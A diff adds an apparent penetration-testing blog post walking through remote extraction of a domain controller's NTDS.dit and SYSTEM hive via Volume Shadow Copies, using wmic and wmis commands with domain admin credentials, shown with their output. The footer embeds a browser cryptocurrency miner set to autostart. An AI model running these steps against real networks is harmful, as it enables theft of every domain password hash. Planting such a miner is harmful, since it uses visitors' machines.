@@ -1,0 +1,222 @@
+<!DOCTYPE html>
+<html>
+
+    <head>
+        <title> Volume Shadow Copy NTDS.dit Domain Hashes Remotely - Part 1 &middot;  </title>
+
+        <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="generator" content="Hugo 0.41" />
+
+
+<script   src="https://code.jquery.com/jquery-3.1.1.min.js"   integrity="sha256-hVVnYaiADRTO2PzUGmuLJr8BLUSjGIZsDYGmIJLv2b8="   crossorigin="anonymous"></script>
+
+
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
+
+
+<link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
+
+
+<link rel="stylesheet" href="https://malicious.link/css/nix.css">
+
+
+<link href="https://fonts.googleapis.com/css?family=Inconsolata|Open+Sans|Roboto|Montserrat|Concert+One" rel="stylesheet">
+
+
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+		  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+		  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+				  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+ga('create', 'UA-198967-1', 'auto');
+	  ga('send', 'pageview');
+
+</script>
+
+
+    </head>
+
+    <body>
+        <header>
+<nav class="navbar navbar-default navbar-fixed-top navbar-inverse font-header">
+	<div class="container-fluid">
+		<div class="navbar-header">
+			<button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar-collapse-1" aria-expanded="false">
+				<span class="sr-only">Toggle navigation</span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+			</button>
+			<a class="navbar-brand" id="green-terminal" href=https://malicious.link/>mubix@malicious.link ~ $</a>
+		</div>
+
+		
+		<div class="collapse navbar-collapse" id="navbar-collapse-1">
+			<ul class="nav navbar-nav navbar-right">
+				<li>
+					<a href="https://malicious.link/">/home/mubix</a>
+				</li>
+
+				
+				
+				<li >
+					<a href="/brandon">~/brandon</a>
+				</li>
+				
+				
+				<li >
+					<a href="/about">~/about</a>
+				</li>
+				
+				
+				<li >
+					<a href="/post">~/posts</a>
+				</li>
+				
+
+			</ul>
+		</div>
+	</div>
+</nav>
+</header>
+
+        <div class="container wrapper">
+            <h1><a href="https://malicious.link/post/2013/2013-06-10-volume-shadow-copy-ntdsdit-domain-hashes-remotely-part-1/">Volume Shadow Copy NTDS.dit Domain Hashes Remotely - Part 1</a></h1>
+            <span class="post-date">Jun 10, 2013 </span>
+            <div class="post-content">
+                <blockquote>
+<p>This and part 2 are mostly just an update to <a href="http://pauldotcom.com/2011/11/safely-dumping-hashes-from-liv.html">http://pauldotcom.com/2011/11/safely-dumping-hashes-from-liv.html</a> but without the need for VSSOwn, that and we are doing it remotely without the need for shell on the DC.</p>
+</blockquote>
+
+<p>Ever run into a Domain Controller that wasn&rsquo;t allowed to talk to the Internet, had insane AV and GPOs not allowing anyone to RDP in (Even Domain Admins) unless they provided some kind of voodo happy dance? Ya me neither, but here is how you can still dump domain hashes and hash history if you run into that case. Lets start</p>
+
+<p>First authenticate to the domain controller and make sure you have a good working directory to use.</p>
+
+<pre><code>net use \\DC1 /user:DOMAIN\domainadminsvc domainadminsvc123
+dir \\DC1\C$
+</code></pre>
+
+<p>Alright, lets say &ldquo;TEMP&rdquo; is there and it&rsquo;s empty on the remote DC. The way we are going to run commands will not allow us to get results directly so we are going to use a temp file on the DC in <code>C:\TEMP</code> where we already made sure is clear.</p>
+
+<p>We are going to be using Volume Shadow Copies to pull the NTDS.dit file (Active Directory&rsquo;s DB much like Window&rsquo;s SAM file except that it stores the entire AD set of objects there), we also need the SYSTEM registry hive. You can get the SAM registry hive as well but that will only get local DC credentials.</p>
+
+<p>So lets list the current volume shadow copies to see if we need to create one, from a Windows command prompt (or if you&rsquo;ve installed wmic for Linux via <a href="http://www.krenger.ch/blog/wmi-commands-from-linux/">http://www.krenger.ch/blog/wmi-commands-from-linux/</a> ) - this <em>IS</em> an interactive command so this won&rsquo;t work very nicely in a Meterpreter shell:</p>
+
+<pre><code>C:\temp&gt;wmic /node:DC1 /user:DOMAIN\domainadminsvc /password:domainadminsvc123 process call create &quot;cmd /c vssadmin list shadows 2&gt;&amp;1 &gt; C:\tempoutput.txt&quot;
+Executing (Win32_Process)-&gt;Create()
+Method execution successful.
+Out Parameters:
+instance of __PARAMETERS
+{
+        ProcessId = 7304;
+        ReturnValue = 0;
+};
+</code></pre>
+
+<p>To break down this command:</p>
+
+<ul>
+<li><code>wmic /node:DC1</code> - tells it to interact with the WMI API on DC1</li>
+<li><code>/user:DOMAIN\domainadminsvc /password:domainadminsvc123</code> - authentication</li>
+<li><code>process call create</code> - WMI speak for create a process</li>
+<li><code>cmd /c</code> - vssadmin doesn&rsquo;t operate outside of cmd for some reason&hellip;</li>
+<li><code>vssadmin list shadows</code> - List any shadow volumes that already exist</li>
+<li><code>2&gt;&amp;1 &gt; C:\temp\output.txt</code> - Take STDIN and STDERROR and throw it in a text file on DC1 C:\TEMP. Make sure you specify full path because you will be executing from within C:\Windows\System32 and its a pain to find anything in that directory. So if you just specify &gt; bob.txt you get to hunt in C:\Windows\System32 or wherever WMI wants to execute you from for bob.txt</li>
+</ul>
+
+<p>Process starts and then you need to view the output file by either copying it down, <code>type \DC1\C$\TEMP\output.txt</code> or mount the C drive as a network share. Either way you should either see something like this:</p>
+
+<pre><code>C:\temp&gt;type output.txt
+vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
+(C) Copyright 2001-2005 Microsoft Corp.
+
+Contents of shadow copy set ID: {671090fd-0198}
+   Contained 1 shadow copies at creation time: 5/31/2013 11:29:03 AM
+      Shadow Copy ID: {0863e309}
+         Original Volume: (C:)\\?\Volume{c44da10e-0154-11e1-b968-806e6f6e6963}\
+         Shadow Copy Volume: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
+         Originating Machine: wpad
+         Service Machine: wpad
+         Provider: 'Microsoft Software Shadow Copy provider 1.0'
+         Type: ClientAccessibleWriters
+         Attributes: Persistent, Client-accessible, No auto release, Differential, Auto recovered
+</code></pre>
+
+<p>or</p>
+
+<pre><code>C:\temp&gt;type output.txt
+vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
+(C) Copyright 2001-2005 Microsoft Corp.
+
+No items found that satisfy the query
+</code></pre>
+
+<p>If there are no shadow copies or the ones there are too old (look at the creation time), you can create a shadow copy using the &lsquo;vssadmin create shadow /for=C: command. (This command only applies to Server OS (Win2k3/Win2k8) but since those are the only two that commonly have NTDS.dit files we don&rsquo;t have to remember this):</p>
+
+<pre><code>C:\temp&gt;wmic /node:DC1 /user:DOMAIN\domainadminsvc /password:domainadminsvc123 process call create &quot;cmd /c vssadmin create shadow /for=C: 2&gt;&amp;1 &gt; C:\temp\output.txt&quot;
+</code></pre>
+
+<p>The other thing to keep in mind is that NTDS.dit isn&rsquo;t always on the main drive. It is commonly on a &ldquo;D&rdquo; drive for safety if a HDD goes bad or something. But it should always be in a folder called NTDS. (By default this is C:WindowsNTDS)</p>
+
+<p>Next we just copy the files out of the shadow copies. First the SYSTEM hive:</p>
+
+<pre><code>C:\temp&gt;wmic /node:DC1 /user:DOMAIN\domainadminsvc /password:domainadminsvc123 process call create &quot;cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\SYSTEM.hive 2&gt;&amp;1 &gt; C:\temp\output.txt&quot;
+</code></pre>
+
+<p>Then the NTDS.dit (notice this one isn&rsquo;t in System32):</p>
+
+<pre><code>C:\temp&gt;wmic /node:DC1 /user:DOMAIN\domainadminsvc /password:domainadminsvc123 process call create &quot;cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit C:\temp\NTDS.dit 2&gt;&amp;1 &gt; C:\temp\output.txt&quot;
+</code></pre>
+
+<p>In Kali Linux you could use the WMIS package to do much the same thing:</p>
+
+<pre><code>root@kali:~# wmis -U DOMAIN\domainadminsvc%domainadminsvc123 //DC1 cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit C:\temp\NTDS.dit 2&gt;&amp;1 &gt; C:\temp\output.txt
+NTSTATUS: NT_STATUS_OK - Success
+</code></pre>
+
+<p>Copy those files to your own system for offline extraction which I&rsquo;ll cover in part 2.</p>
+
+            </div>
+            
+            <div class="post-comments">
+                
+            </div>
+            
+            <div class="push"></div>
+        </div>
+        <footer class="footer text-center">
+<p>
+	<center>
+	<b>If you wish to support this blog, please consider clicking start for a little bit. Thanks!</b>
+	<br />
+	<script src="https://authedmine.com/lib/simple-ui.min.js" async></script>
+	<div class="coinhive-miner"
+	style="width: 800px; height: 80px"
+	data-key="Fq2psjl0HfUkdM4LuKrCulHymNpmFuXb"
+	data-whitelabel="true"
+	data-text="#000000"
+	data-background="#F5F5F5"
+	data-user="blog"
+	data-autostart="true"
+	>
+	<em>Loading...</em>
+	</div>
+	</center>
+</p>
+<p>Copyright &copy; 2018 Malicious.Link -
+<span class="credit">
+	Powered by
+	<a target="_blank" href="https://gohugo.io">Hugo</a>
+	and
+	<a target="_blank" href="https://github.com/LordMathis/hugo-theme-nix/">Nix</a> theme.
+</span>
+</p>
+
+</footer>
+
+    </body>
